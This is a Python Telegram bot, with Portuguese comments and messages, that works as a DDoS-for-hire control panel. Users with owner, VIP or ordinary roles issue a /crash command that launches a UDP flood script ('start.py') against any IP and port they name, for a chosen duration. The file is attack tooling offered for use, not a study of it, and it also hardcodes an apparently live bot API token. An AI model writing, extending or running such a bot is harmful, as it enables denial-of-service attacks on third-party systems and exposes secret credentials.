import telebot
import subprocess
import threading

API_TOKEN = '7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8'
bot = telebot.TeleBot(API_TOKEN)

# Configuração inicial de IDs e comandos VIP
DONO_ID = 6430703027  # ID fixo do dono
users = {DONO_ID: 'dono'}  # Estrutura: {ID: cargo ('dono', 'vip', 'usuario')}
vip_commands = []  # Lista de comandos que são exclusivos para VIPs

# Função para verificar o cargo do usuário
def get_user_role(user_id):
    return users.get(user_id, None)

# Função para verificar se um comando é VIP
def is_vip_command(command):
    return command in vip_commands

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_role = get_user_role(message.from_user.id)
    if not user_role:
        bot.reply_to(message, "Você não está autorizado a usar este bot.")
        return

    menu = (
        "Olá, seja bem-vindo ao bot!\n\n"
        "Aqui estão os comandos disponíveis:\n"
        "/crash <IP:PORT> <porta> <duração> - Executa um ataque UDP no IP especificado.\n"
        "/meuid - Mostra o seu ID de usuário.\n"
    )

    if user_role in ['dono', 'vip']:
        menu += (
            "\nComandos para gerenciar usuários:\n"
            "/adduser <ID> - Adiciona um novo usuário ao bot.\n"
            "/removeuser <ID> - Remove um usuário do bot.\n"
        )
        if user_role == 'dono':
            menu += (
                "\nComandos para gerenciar comandos VIP:\n"
                "/addcomandovip <comando> - Torna um comando exclusivo para VIPs.\n"
                "/revcomandovip <comando> - Remove a exclusividade VIP de um comando.\n"
                "/promovervip <ID> - Torna um usuário VIP.\n"
                "/rebaixaruser <ID> - Rebaixa um VIP para usuário comum.\n"
            )

    bot.reply_to(message, menu)

@bot.message_handler(commands=['adduser'])
def add_user(message):
    if get_user_role(message.from_user.id) not in ['dono', 'vip']:
        bot.reply_to(message, "Você não tem permissão para adicionar usuários.")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "Uso correto: /adduser <ID>")
            return

        new_user_id = int(command_parts[1])
        if new_user_id in users:
            bot.reply_to(message, f"O ID {new_user_id} já está autorizado como {users[new_user_id]}.")
        else:
            users[new_user_id] = 'usuario'
            bot.reply_to(message, f"O ID {new_user_id} foi adicionado como usuário comum.")
    except ValueError:
        bot.reply_to(message, "Por favor, forneça um ID válido.")

@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    if get_user_role(message.from_user.id) not in ['dono', 'vip']:
        bot.reply_to(message, "Você não tem permissão para remover usuários.")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "Uso correto: /removeuser <ID>")
            return

        remove_user_id = int(command_parts[1])
        if remove_user_id == DONO_ID:
            bot.reply_to(message, "O dono não pode ser removido.")
        elif remove_user_id not in users:
            bot.reply_to(message, f"O ID {remove_user_id} não está na lista de autorizados.")
        else:
            del users[remove_user_id]
            bot.reply_to(message, f"O ID {remove_user_id} foi removido da lista de usuários autorizados.")
    except ValueError:
        bot.reply_to(message, "Por favor, forneça um ID válido.")

@bot.message_handler(commands=['promovervip'])
def promote_to_vip(message):
    if get_user_role(message.from_user.id) != 'dono':
        bot.reply_to(message, "Apenas o dono pode promover usuários a VIP.")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "Uso correto: /promovervip <ID>")
            return

        user_id = int(command_parts[1])
        if user_id not in users:
            bot.reply_to(message, f"O ID {user_id} não está na lista de usuários.")
        else:
            users[user_id] = 'vip'
            bot.reply_to(message, f"O ID {user_id} foi promovido a VIP.")
    except ValueError:
        bot.reply_to(message, "Por favor, forneça um ID válido.")

@bot.message_handler(commands=['rebaixaruser'])
def demote_user(message):
    if get_user_role(message.from_user.id) != 'dono':
        bot.reply_to(message, "Apenas o dono pode rebaixar usuários.")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "Uso correto: /rebaixaruser <ID>")
            return

        user_id = int(command_parts[1])
        if user_id == DONO_ID:
            bot.reply_to(message, "O dono não pode ser rebaixado.")
        elif user_id not in users or users[user_id] != 'vip':
            bot.reply_to(message, f"O ID {user_id} não é um VIP.")
        else:
            users[user_id] = 'usuario'
            bot.reply_to(message, f"O ID {user_id} foi rebaixado para usuário comum.")
    except ValueError:
        bot.reply_to(message, "Por favor, forneça um ID válido.")

@bot.message_handler(commands=['addcomandovip'])
def add_vip_command(message):
    if get_user_role(message.from_user.id) != 'dono':
        bot.reply_to(message, "Apenas o dono pode adicionar comandos VIP.")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "Uso correto: /addcomandovip <comando>")
            return

        command = command_parts[1]
        if command in vip_commands:
            bot.reply_to(message, f"O comando {command} já é exclusivo para VIPs.")
        else:
            vip_commands.append(command)
            bot.reply_to(message, f"O comando {command} agora é exclusivo para VIPs.")
    except Exception as e:
        bot.reply_to(message, f"Erro: {str(e)}")

@bot.message_handler(commands=['revcomandovip'])
def remove_vip_command(message):
    if get_user_role(message.from_user.id) != 'dono':
        bot.reply_to(message, "Apenas o dono pode remover comandos VIP.")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "Uso correto: /revcomandovip <comando>")
            return

        command = command_parts[1]
        if command not in vip_commands:
            bot.reply_to(message, f"O comando {command} não é exclusivo para VIPs.")
        else:
            vip_commands.remove(command)
            bot.reply_to(message, f"O comando {command} agora está disponível para todos os usuários.")
    except Exception as e:
        bot.reply_to(message, f"Erro: {str(e)}")

@bot.message_handler(commands=['crash'])
def handle_crash(message):
    user_role = get_user_role(message.from_user.id)
    if not user_role:
        bot.reply_to(message, "Você não está autorizado a usar este comando.")
        return

    if is_vip_command('/crash') and user_role not in ['dono', 'vip']:
        bot.reply_to(message, "Este comando é exclusivo para VIPs.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 3:
        bot.reply_to(message, "Comando inválido. Use o formato: /crash <IP:PORT> <porta> <duração>")
        return

    target = command_parts[1]
    duration = command_parts[2]

    bot.reply_to(message, f"Comando de ataque enviado para {target} por {duration}s!")
    command = f"python start.py UDP {target} {duration}"
    threading.Thread(target=subprocess.run, args=(command,)).start()

@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.reply_to(message, f"Seu ID de usuário é: {message.from_user.id}")

# Inicia o bot
bot.polling()